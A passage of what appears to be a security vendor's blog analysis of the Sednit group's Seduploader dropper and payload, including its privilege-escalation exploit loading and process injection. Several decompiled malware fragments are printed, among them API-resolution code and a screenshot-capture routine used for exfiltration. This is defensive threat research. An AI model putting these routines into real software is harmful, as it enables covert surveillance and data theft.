class="crayon-cn">0x20</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">v2</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">v135</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">v7</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">__ROL4__</span><span class="crayon-sy">(</span><span class="crayon-v">v5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">++</span><span class="crayon-v">v3</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">v5</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">v4</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-v">v7</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">v4</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">v3</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">++</span><span class="crayon-v">v6</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-i">v3</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">v1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">v133</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">v5</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-v">kernel32</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">addr_kernel32</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-sy">(</span><span class="crayon-v">v2</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">24</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-v">ntdll</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">addr_ntdll</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-sy">(</span><span class="crayon-v">v2</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">24</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-v">user32</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">addr_user32</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-sy">(</span><span class="crayon-v">v2</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">24</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caea731452193-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60581b882caea731452193-45"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0010 seconds] -->
<p>After more decryption, the Seduploader Dropper is then loaded and executed. Note that all this execution happens within the <span style="font-family: 'courier new', courier, monospace;">WINWORD.EXE</span> process running with the current user’s privileges.</p>
<h2><strong>Seduploader Dropper</strong></h2>
<p>Seduploader is made up of two distinct components: a dropper and a persistent payload (see page 27 of our <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf" target="_blank" rel="noopener noreferrer">En Route with Sednit whitepaper</a>).</p>
<p>While the dropper used in this attack has evolved since the last version we analyzed, its end goal remains the same: to deliver the <a href="https://www.welivesecurity.com/2016/10/25/lifting-lid-sednit-closer-look-software-uses/" target="_blank" rel="noopener noreferrer">Seduploader Payload</a>. This new version of the dropper now contains code to integrate the LPE exploit for CVE-2017-2063. The detailed analysis of this vulnerability can be found in the next section of the blog; for now, we will focus on Seduploader.</p>
<p>First, the new code in the dropper checks if the process is running on a 32-bit or 64-bit version of Windows. Depending of the result, the correct exploit version will be loaded in memory.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882caeb809094059" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[...]
 if ( Is64Process() == 1 )
 {
     addr_exploit = exploit_64b;
     size_exploit = 0x2E00;
 }
 else
 {
     addr_exploit = exploit_32b;
     size_exploit = 0x2400;
 }
[...]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882caeb809094059-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caeb809094059-2">2</div><div class="crayon-num" data-line="crayon-60581b882caeb809094059-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caeb809094059-4">4</div><div class="crayon-num" data-line="crayon-60581b882caeb809094059-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caeb809094059-6">6</div><div class="crayon-num" data-line="crayon-60581b882caeb809094059-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caeb809094059-8">8</div><div class="crayon-num" data-line="crayon-60581b882caeb809094059-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caeb809094059-10">10</div><div class="crayon-num" data-line="crayon-60581b882caeb809094059-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caeb809094059-12">12</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882caeb809094059-1"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caeb809094059-2"><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">Is64Process</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b882caeb809094059-3"><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caeb809094059-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">addr_exploit</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">exploit_64b</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caeb809094059-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">size_exploit</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x2E00</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caeb809094059-6"><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60581b882caeb809094059-7"><span class="crayon-h"> </span><span class="crayon-st">else</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caeb809094059-8"><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b882caeb809094059-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">addr_exploit</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">exploit_32b</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caeb809094059-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">size_exploit</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x2400</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caeb809094059-11"><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caeb809094059-12"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Once the exploit is successfully executed, Seduploader Dropper will reload itself in WINWORD’s memory space and call <span style="font-family: 'courier new', courier, monospace;">CreateRemoteThread</span> with the address of the <span style="font-family: 'courier new', courier, monospace;">UpLoader</span> entry point, which will execute the code in charge of installing the Seduploader Payload. This code will run with System privileges, thanks to the exploit.</p>
<h2><strong>Seduploader Payload</strong></h2>
<p>Seduploader Payload is a downloader used by Sednit’s operators as reconnaissance malware and is composed of two parts. The first is responsible for injecting the second part in the proper process, depending on whether it is loaded in the <span style="font-family: 'courier new', courier, monospace;">WINWORD.EXE</span> process or not. The second part is the downloader itself.</p>
<p>If Seduploader is running in <span style="font-family: 'courier new', courier, monospace;">WINWORD.EXE</span>, its first part will create a mutex named <span style="font-family: 'courier new', courier, monospace;">flPGdvyhPykxGvhDOAZnU</span> and open a handle to the current process. That handle will be used to allocate memory and write in it the code of the second part of the Payload component, which will then be executed by a call to <span style="font-family: 'courier new', courier, monospace;">CreateRemoteThread</span>. Otherwise, if it is not running in <span style="font-family: 'courier new', courier, monospace;">WINWORD.EXE</span>, Seduploader will use <span style="font-family: 'courier new', courier, monospace;">CreateThread</span> to launch its second part.</p>
<p>The downloader contains the usual Seduploader functions and strings encryption algorithm. However, it contains a certain number of changes that we describe below.</p>
<p>First, the hashing algorithm used to identify DLL names and API functions to resolve was replaced by a new one. The attentive readers of our whitepaper will recall that the old hashing algorithm was strongly inspired from code found in Carberp. Well, the new algorithm was also not created from scratch: this time, Sednit used code very similar to <a href="http://researchcenter.paloaltonetworks.com/2016/03/powersniff-malware-used-in-macro-based-attacks/" target="_blank" rel="noopener noreferrer">PowerSniff</a>.</p>
<p>Next, a new img tag was added in Seduploader’s report message. This tag allows the exfiltration of screenshots:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882caed817309743" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[...]
keybd_event(VK_SNAPSHOT, 0x45u, KEYEVENTF_EXTENDEDKEY, 0u);
Sleep(1000u);
keybd_event(VK_SNAPSHOT, 0x45u, KEYEVENTF_EXTENDEDKEY|KEYEVENTF_KEYUP, 0u);
OpenClipboard(0u);
hData = GetClipboardData(CF_BITMAP);
CloseClipboard();
if ( !hData )
  return 0;
GdiplusStartupInput = (const int *)1;
v10 = 0;
v11 = 0;
v12 = 0;
GdiplusStartup(&amp;token, &amp;GdiplusStartupInput, 0);
if ( fGetEncoderClsid((int)L"image/jpeg", &amp;imageCLSID) )
{
  v4 = sub_10003C5F((int)hData, 0);
  ppstm = 0;
  CreateStreamOnHGlobal(0u, 1u, &amp;ppstm);
  v5 = GdipSaveImageToStream(v4[1], ppstm, &amp;imageCLSID, 0);
  if ( v5 )
    v4[2] = v5;
  (*(void (__thiscall **)(_DWORD *, signed int))*v4)(v4, 1);
  IStream_Size(ppstm, &amp;pui);
  cb = pui.s.LowPart;
  v7 = ppstm;
  *a1 = pui.s.LowPart;
  IStream_Reset(v7);
  v1 = j_HeapAlloc(cb);
  IStream_Read(ppstm, v1, cb);
  ppstm-&gt;lpVtbl-&gt;Release(ppstm);
}
GdiplusShutdown(token);
return v1;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882caed817309743-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-2">2</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-4">4</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-6">6</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-8">8</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-10">10</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-12">12</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-14">14</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-16">16</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-18">18</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-20">20</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-22">22</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-24">24</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-26">26</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-28">28</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-30">30</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-32">32</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caed817309743-34">34</div><div class="crayon-num" data-line="crayon-60581b882caed817309743-35">35</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882caed817309743-1"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-2"><span class="crayon-e">keybd_event</span><span class="crayon-sy">(</span><span class="crayon-v">VK_SNAPSHOT</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x45u</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">KEYEVENTF_EXTENDEDKEY</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0u</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-3"><span class="crayon-e">Sleep</span><span class="crayon-sy">(</span><span class="crayon-cn">1000u</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-4"><span class="crayon-e">keybd_event</span><span class="crayon-sy">(</span><span class="crayon-v">VK_SNAPSHOT</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x45u</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">KEYEVENTF_EXTENDEDKEY</span><span class="crayon-o">|</span><span class="crayon-v">KEYEVENTF_KEYUP</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0u</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-5"><span class="crayon-e">OpenClipboard</span><span class="crayon-sy">(</span><span class="crayon-cn">0u</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-6"><span class="crayon-v">hData</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">GetClipboardData</span><span class="crayon-sy">(</span><span class="crayon-v">CF_BITMAP</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-7"><span class="crayon-e">CloseClipboard</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-8"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-i">hData</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-9"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-10"><span class="crayon-v">GdiplusStartupInput</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-m">const</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-sy">)</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-11"><span class="crayon-v">v10</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-12"><span class="crayon-v">v11</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-13"><span class="crayon-v">v12</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-14"><span class="crayon-e">GdiplusStartup</span><span class="crayon-sy">(</span><span class="crayon-o">&amp;</span><span class="crayon-v">token</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">GdiplusStartupInput</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-15"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">fGetEncoderClsid</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-sy">)</span><span class="crayon-i">L</span><span class="crayon-s">"image/jpeg"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">imageCLSID</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-16"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-17"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">v4</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">sub_10003C5F</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-sy">)</span><span class="crayon-v">hData</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-18"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">ppstm</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-19"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">CreateStreamOnHGlobal</span><span class="crayon-sy">(</span><span class="crayon-cn">0u</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1u</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">ppstm</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-20"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">v5</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">GdipSaveImageToStream</span><span class="crayon-sy">(</span><span class="crayon-v">v4</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">ppstm</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">imageCLSID</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-21"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">v5</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">v4</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">v5</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-23"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">(</span><span class="crayon-o">*</span><span class="crayon-sy">(</span><span class="crayon-t">void</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e ">__thiscall *</span><span class="crayon-o">*</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-e 